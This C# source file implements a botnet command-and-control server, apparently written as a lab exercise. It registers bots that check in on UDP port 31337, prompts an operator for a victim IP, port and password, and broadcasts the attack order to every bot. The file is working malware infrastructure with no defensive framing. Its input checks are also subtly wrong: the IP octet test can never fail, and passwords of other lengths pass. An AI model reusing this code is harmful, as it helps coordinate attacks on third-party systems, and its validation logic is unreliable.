using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace C_and_C
{
    class cc
    {
        static List<bot> bots = new List<bot>();
        static string server_name = "CH3353BUR63R W17H 3X7R4 K37CHUP!";
        static void Main()
        {
            try
            {
                Thread thread_user = new Thread(() => user());
                Thread thread_udp_lisener = new Thread(() => udp_lisener());

                thread_user.Start();
                thread_udp_lisener.Start();
            }
            catch (Exception e)
            {

            }
        }

        private static void user()
        {
            while (true)
            {
                Console.WriteLine("Command and control server "+server_name+" active");
                Console.Write("Insert victim IP: ");
                string ip = Console.ReadLine();
                if (!is_legal_ip(ip))
                {
                    Console.Clear();
                    Console.WriteLine("Illegal victim IP");
                    Thread.Sleep(2500);
                    Console.Clear();
                    continue;
                }

                Console.Write("Insert victim port: ");
                string port = Console.ReadLine();
                if (!is_legal_port(port))
                {
                    Console.Clear();
                    Console.WriteLine("Illegal port number");
                    Thread.Sleep(2500);
                    Console.Clear();
                    continue;
                }

                Console.Write("Insert victim password: ");
                string password = Console.ReadLine();
                if (!is_legal_password(password))
                {
                    Console.Clear();
                    Console.WriteLine("Illegal victim password");
                    Thread.Sleep(2500);
                    Console.Clear();
                    continue;
                }
                send_active_bots(ip, port, password);
            }
        }

        private static bool is_legal_ip(string ip)
        {
            bool ans = false;
            try
            {
                string[] str = ip.Split('.');
                if (str.Length == 4)
                {
                    foreach (string s in str)
                    {
                        int tmp = int.Parse(s);
                        if (tmp < 0 && tmp > 255)
                        {
                            ans = false;
                            break;
                        }
                    }
                    ans = true;
                }
            }
            catch(Exception e)
            {

            }
            
            return ans;
        }

        private static bool is_legal_port(string port)
        {
            bool ans = false;
            try
            {
                int p = int.Parse(port);
                if (p > 1023 && p < 65536)
                    ans = true;
            }
            catch (Exception e)
            {

            }

            return ans;
        }

        private static bool is_legal_password(string password)
        {
            bool ans = true;
            try
            {
                if(password.Length == 6)
                {
                    foreach(char p in password)
                    {
                        int c = p;
                        if(c < 97 || c > 122)
                        {
                            ans = false;
                            break;
                        }
                    }
                }
            }
            catch (Exception e)
            {

            }

            return ans;
        }

        private static byte[] create_msg(string ip, string port, string password)
        {
            byte[] msg = new byte[44];
            string[] s = ip.Split('.');
            for (int i = 0; i < s.Length; i++)
            {
                msg[i] = byte.Parse(s[i]);
            }

            byte[] p = BitConverter.GetBytes(int.Parse(port));
            msg[4] = p[0];
            msg[5] = p[1];

            p = Encoding.ASCII.GetBytes(password);
            for (int i = 0; i < p.Length; i++)
            {
                msg[i + 6] = p[i];
            }

            p = Encoding.ASCII.GetBytes(server_name);
            for (int i = 0; i < p.Length; i++)
            {
                msg[i + 12] = p[i];
            }

            return msg;
        }

        private static void send_active_bots(string ip, string port, string password)
        {
            byte[] send = create_msg(ip, port, password);
            int count = 0;
            foreach (bot b in bots)
            {
                try
                {
                    UdpClient client = new UdpClient();
                    IPEndPoint ip_bot = new IPEndPoint(IPAddress.Parse(b.ip), b.port);
                    client.Send(send, send.Length, ip_bot);
                    count += 1;
                    client.Close();
                }
                catch(Exception e)
                {

                }
            }
            Console.WriteLine("Attacking victim on IP " + ip + ", port " + port + " with " + count + " bots");
            Thread.Sleep(2500);
            Console.Clear();
        }

        private static void udp_lisener()
        {

            UdpClient listener = new UdpClient(31337);
            IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 31337);
            while (true)
            {
                byte[] rec = listener.Receive(ref RemoteIpEndPoint);
                if (rec.Length == 2)
                {
                    byte[] rec2 = { rec[0], rec[1], 0, 0 };
                    int restored = BitConverter.ToInt32(rec2, 0); //for the server to convert
                    //Console.WriteLine("server recieved bot that listen to port: " + restored);
                    if (restored>1023 && restored < 65536)
                    {
                        bot b = new bot() { ip = RemoteIpEndPoint.Address.ToString(), port = restored };
                        if (!bots.Contains(b))
                            bots.Add(b);
                    }
                }
            }
        }

        public class bot : IEquatable<bot>
        {
            public string ip { get; set; }

            public int port { get; set; }

            public bool Equals(bot other)
            {
                if (other == null) return false;
                return (this.ip.Equals(other.ip) && this.port.Equals(other.port));
            }
            public override string ToString()
            {
                return "IP: " + ip + "   Port: " + port;
            }
            public override bool Equals(object obj)
            {
                if (obj == null) return false;
                bot objAsPart = obj as bot;
                if (objAsPart == null) return false;
                else return Equals(objAsPart);
            }
            public override int GetHashCode()
            {
                return port;
            }
        }
    }
}
